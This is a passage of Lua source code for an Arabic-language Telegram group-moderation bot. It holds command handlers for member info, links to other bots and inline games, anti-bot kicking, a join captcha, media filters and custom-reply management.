if text == "يوتيوب" and ChCheck(msg) or text == "اليوتيوب" and ChCheck(msg) or text == "↫ بوت اليوتيوب ᥀" and ChCheck(msg) or text == "بوت اليوتيوب" and ChCheck(msg) or text == "اريد بوت يوتيوب" and ChCheck(msg) or text == "شمرلي بوت يوتيوب" and ChCheck(msg) or text == "يوت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/t_stbot"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على بوت اليوتيوب*',nil,inline) return false end
if text == "اهمس" and ChCheck(msg) or text == "↫ بوت الهمسه ᥀" and ChCheck(msg) or text == "بوت الهمسه" and ChCheck(msg) or text == "همسه" and ChCheck(msg) or text == "اريد بوت الهمسه" and ChCheck(msg) or text == "دزلي بوت الهمسه" and ChCheck(msg) or text == "دزولي بوت الهمسه" and ChCheck(msg) then  Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙@HMSEBOT\n᥀︙@nnbbot\n᥀︙@ocBot\n᥀︙@hebot ', 1, 'md') end
if text == "رابط حذف" and ChCheck(msg) or text == "رابط الحذف" and ChCheck(msg) or text == "اريد رابط الحذف" and ChCheck(msg) or text == "شمرلي رابط الحذف" and ChCheck(msg) or text == "اريد رابط حذف" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على رابط الحذف*',nil,inline) return false end
if text == "↫ بوت الحذف ᥀" and ChCheck(msg) or text == "بوت الحذف" and ChCheck(msg) or text == "اريد بوت الحذف" and ChCheck(msg) or text == "اريد بوت حذف" and ChCheck(msg) or text == "بوت حذف" and ChCheck(msg) or text == "بوت حذف حسابات" and ChCheck(msg) or text == "راح احذف" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على بوت الحذف*',nil,inline) return false end
if text == "↫ بوت الكت ᥀" and ChCheck(msg) or text == "بوت الكت" and ChCheck(msg) or text == "بوت كت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/E9OBot"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على بوت الكت*',nil,inline) return false end
if text == "↫ بوت الزخرفه ᥀" and ChCheck(msg) or text == "بوت الزخرفه" and ChCheck(msg) or text == "بوت زخرفه" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/W5555Bot"}}} SendInline(msg.chat_id_,'*᥀︙اضغط للحصول على بوت الزخرفه*',nil,inline) return false end
if text == "ايديي" and ChCheck(msg) or text == "↫ ايديي ᥀" and ChCheck(msg) then Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
-- Source BlAcK --
if text == 'نبذا' and ChCheck(msg) or text == '↫ نبذا ᥀' then
local BlAcKTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_Joker(msg.chat_id_, msg.id_, 1, ''..BlAcKTeam[math.random(#BlAcKTeam)]..'' , 1, 'md')  
return false
end
--     Source BlAcK     --
if text and (text == 'المطور' or text == 'مطور' or text == '↫  المطور ᥀') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,result)
local msg_id = msg.id_/2097152/0.5
Text = "*᥀︙Dev Name ↬ * ["..result.first_name_.."](T.me/"..result.username_..")\n*᥀︙Dev User ↬* [@"..result.username_.."]"
keyboard = {} 
keyboard.inline_keyboard = {{{text = ''..result.first_name_..' ',url="t.me/"..result.username_ or BLACK_TEAM_4}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
--     Source BlAcK     --
if text == "معرفي" or text == "↫  معرفي ᥀" then
function get_username(extra,result,success)
text = '᥀︙معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "اسمي" or text == "↫  اسمي ᥀" then
function get_firstname(extra,result,success)
text = '᥀︙اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end 
if text == 'نبذتي' or text == 'بايو' or text == '↫  نبذتي ᥀' then
send(msg.chat_id_, msg.id_,'['..GetBio(msg.sender_user_id_)..']')
end
if text == "صورتي" or text == "↫ صورتي ᥀" then
local my_ph = DevJoker:get(BlAcK.."Joker:Photo:Profile"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," ᥀︙الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ᥀︙عدد صورك ↫ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
--     Source BlAcK     --
if text == "الالعاب المتطوره" or text == "الالعاب الاحترافيه" or text == "↫ الالعاب المتطوره ᥀" then
if not DevJoker:get(BlAcK..'Joker:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*᥀︙قائمه الالعاب المتطوره اضغط للعب*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text="♟ الشطرنج ♟",url='https://t.me/T4TTTTBOT?game=chess'}},
{{text="لعبة فلابي بيرد 🐥",url='https://t.me/awesomebot?game=FlappyBird'},{text="تحدي الرياضيات",url='https://t.me/gamebot?game=MathBattle'}},
{{text="اكس او",url='t.me/xobot?start'},{text="سباق الدراجات 🏍",url='https://t.me/gamee?game=MotoFX'}},
{{text="سباق سيارات 🏎",url='https://t.me/gamee?game=F1Racer'},{text="متشابه 👾",url='https://t.me/gamee?game=DiamondRows'}},
{{text="كرة قدم ⚽",url='https://t.me/gamee?game=FootballStar'}},
{{text="ورق🤹‍♂",url='https://t.me/gamee?game=Hexonix'},{text="Hexonix❌",url='https://t.me/gamee?game=Hexonix'}},
{{text="MotoFx🏍️",url='https://t.me/gamee?game=MotoFx'}},
{{text="لعبة 2048 🎰",url='https://t.me/awesomebot?game=g2048'},{text="Squares🏁",url='https://t.me/gamee?game=Squares'}},
{{text="Atomic 1▶️",url='https://t.me/gamee?game=AtomicDrop1'},{text="Corsairs",url='https://t.me/gamebot?game=Corsairs'}},
{{text="LumberJack",url='https://t.me/gamebot?game=LumberJack'}},
{{text="LittlePlane",url='https://t.me/gamee?game=LittlePlane'},{text="RollerDisco",url='https://t.me/gamee?game=RollerDisco'}},
{{text="🦖 لعبة التنين 🦖",url='https://t.me/T4TTTTBOT?game=dragon'},{text="🐍 لعبة الافعى 🐍",url='https://t.me/T4TTTTBOT?game=snake'}},
{{text="🔵 لعبة الالوان 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
{{text="🚀 لعبة الصاروخ 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 لعبة السهام 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
{{text="لعبة النينجا",url='https://t.me/gamee?game=GravityNinja21'},{text="لعبة الكرتي",url='https://t.me/gamee?game=KarateKid2'}},
{{text = '᥀ BlAcK Team .', url="t.me/BLACK_TEAM_4"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     Source BlAcK     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
DevJoker:incr(BlAcK..'Joker:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevJoker:set(BlAcK.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevJoker:get(BlAcK.."Joker:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevJoker:sadd(BlAcK..'Joker:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(BlAcK) then 
DevJoker:srem(BlAcK.."Joker:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) and not Bot(msg) then
SendText(DevId,"᥀︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevJoker:get(BlAcK..'Joker:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevJoker:incr(BlAcK..'Joker:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevJoker:incr(BlAcK..'Joker:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source BlAcK     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevJoker:get(BlAcK..'Joker:Lock:FreeBot'..BlAcK) then
if ChatType == 'pv' then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,Joker) 
local admins = Joker.members_
for i=0 , #admins do
if Joker.members_[i].bot_info_ == false and Joker.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if Joker.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevJoker:sadd(BlAcK.."Joker:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevJoker:sadd(BlAcK.."Joker:JokerConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevJoker:srem(BlAcK.."Joker:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevJoker:srem(BlAcK.."Joker:JokerConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevJoker:sismember(BlAcK..'Joker:Groups',msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevJoker:get(BlAcK..'Joker:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevJoker:get(BlAcK..'Joker:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevJoker:sadd(BlAcK.."Joker:Groups",msg.chat_id_)
DevJoker:sadd(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevJoker:set(BlAcK.."Joker:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"᥀︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙موقعه في المجموعه ↫ "..status.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
--     Source BlAcK     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevJoker:set(BlAcK..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source BlAcK     --
local ReFalse = tostring(msg.chat_id_)
if not DevJoker:sismember(BlAcK.."Joker:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False : The Bot Is Not Enabled In The Group")
return false
end
--     Source BlAcK     --
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if DevJoker:get(BlAcK..'Joker:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevJoker:sadd(BlAcK..'Joker:Tkeed:'..msg.chat_id_, dp.id_)
local Text = '᥀︙اهلا عزيزي ↫ ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\n᥀︙يجب علينا التأكد أنك لست روبوت\n᥀︙تم تقيدك اضغط الزر بالاسفل لفكه'
keyboard = {} 
keyboard.inline_keyboard = {{{text="اضغط هنا لفك تقيدك",callback_data="/UnTkeed"}}} 
Msg_id = msg.id_/2097152/0.5
HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
return false
end
if DevJoker:get(BlAcK.."Joker:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Bot(msg) then 
local filter = DevJoker:smembers(BlAcK.."Joker:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙الصوره التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Bot(msg) then 
local filter = DevJoker:smembers(BlAcK.."Joker:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙المتحركه التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Bot(msg) then 
local filter = DevJoker:smembers(BlAcK.."Joker:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙الملصق الذي ارسلته تم منعه من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     Source BlAcK     --
if text and text:match("^(.*)$") then
local DelGpRedRedods = DevJoker:get(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevJoker:get(BlAcK..'Joker:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevJoker:del(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevJoker:srem(BlAcK..'Joker:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevJoker:get(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevJoker:del(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevJoker:srem(BlAcK..'Joker:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevJoker:get(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevJoker:del(BlAcK..'Joker:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevJoker:del(BlAcK..'Joker:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevJoker:srem(BlAcK..'Joker:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevJoker:get(BlAcK.."Joker:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Joker(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevJoker:del(BlAcK.."Joker:Add:AllRed"..msg.sender_user_id_)
DevJoker:del(BlAcK.."Joker:Gif:AllRed"..msg.content_.text_)
DevJoker:del(BlAcK.."Joker:Voice:AllRed"..msg.content_.text_)
DevJoker:del(BlAcK.."Joker:Audio:AllRed"..msg.content_.text_)
DevJoker:del(BlAcK.."Joker:Photo:AllRed"..msg.content_.text_)
DevJoker:del(BlAcK.."Joker:Stecker:AllRed"..msg.content_.text_)
DevJoker:del(BlAcK.."Joker:Video:AllRed"..msg.content_.text_)
DevJoker:del(BlAcK.."Joker:File:AllRed"..msg.content_.text_)
DevJoker:del(BlAcK.."Joker:Text:AllRed"..msg.content_.text_)
DevJoker:del(BlAcK.."Joker:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source BlAcK     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevJoker:get(BlAcK..'Joker:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevJoker:get(BlAcK..'Joker:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
